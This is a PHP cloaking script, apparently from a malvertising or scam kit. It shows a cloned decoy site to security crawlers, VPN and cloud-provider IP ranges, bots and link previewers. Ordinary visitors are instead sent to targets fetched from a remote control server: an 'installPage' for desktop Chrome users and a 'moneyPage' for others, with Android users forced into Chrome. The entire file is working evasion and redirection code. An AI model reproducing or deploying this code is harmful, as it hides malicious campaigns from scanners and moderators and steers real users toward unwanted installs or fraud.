<?php
error_reporting(E_ERROR | E_PARSE);
include __DIR__ ."/includes/functions.php";
  $bannedORGS = "proxy|Proxy|VPN|Vpn|Vps|Grapeshot|Ocean|Department|Amazon|Aerojet|Linode|Yandex|Python|Proxy|IANA|MegaPath|Private|KDDI|Facebook|FB|fb|Temasek|Edge|Anonymous|Proxy|VPS|Haskell|M247|Iliad|Taiwan Academic Network|Consolidated Communications|TE Data|AS250|LIAZO|Datasource|Turk|Accelerated|Broadnet|UK2|root|SURFnet|NFOrce,Voxility|ARBITAL|Privax|Google|Steadfast Networks|Facebook|Microsoft Corporation|CtrlS D";
  if(banned_org(Detect::ipOrg(), $bannedORGS)){
    cloneWeb();
    exit();
  	}
  else if ((isset($_SERVER['HTTP_FROM'])) && ($_SERVER['HTTP_FROM'] == 'googlebot(at)googlebot.com')) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_COOKIE'])) && ($_SERVER['HTTP_COOKIE'] == '')) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_ACCEPT'])) && ($_SERVER['HTTP_ACCEPT'] == '*/*')) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_X_PURPOSE'])) && ($_SERVER['HTTP_X_PURPOSE'] == 'preview')) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_X_FB_HTTP_ENGINE'])) && ($_SERVER['HTTP_X_FB_HTTP_ENGINE'] == 'Liger')) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_X_FB_HTTP_ENGINE'])) && ($_SERVER['HTTP_X_FB_HTTP_ENGINE'] == 'Tigon')) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_X_FB_HTTP_ENGINE'])) && ($_SERVER['HTTP_X_FB_HTTP_ENGINE'] == 'iOS')) {
    cloneWeb();
    exit();
  }
  if ((strpos($_SERVER['HTTP_USER_AGENT'], 'scrape') !== false) || (strpos($_SERVER['HTTP_USER_AGENT'], 'python') !== false) || (strpos($_SERVER['HTTP_USER_AGENT'], 'fetch') !== false) || (strpos($_SERVER['HTTP_USER_AGENT'], 'bot') !== false)) {
    cloneWeb();
    exit();
  }
  else if ((isset($_SERVER['HTTP_X_MOZ'])) && ($_SERVER['HTTP_X_MOZ'] == 'prefetch')) {
    cloneWeb();
    exit();
  } else {
      $ch =  curl_init('http://rb-cdn.com/control.php');
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
      curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
      curl_setopt($ch, CURLOPT_TIMEOUT, 3);
      curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: application/json'));
      $result = curl_exec($ch);
      $data = json_decode($result);
      $money = $data['moneyPage'];
      $installPage = $data['installPage'];
    if (Detect::isComputer() && contains('Chrome', Detect::browser())) {
      header('location: '. $installPage);
      exit;
    } else if (Detect::isMobile() && Detect::isAndroidOS()) {
      header('location: intent://'. $money .'#Intent;scheme=http;package=com.android.chrome;end');
      exit;
    } else  {
      header('location: '. $money);
      exit;
    }
  }
?>
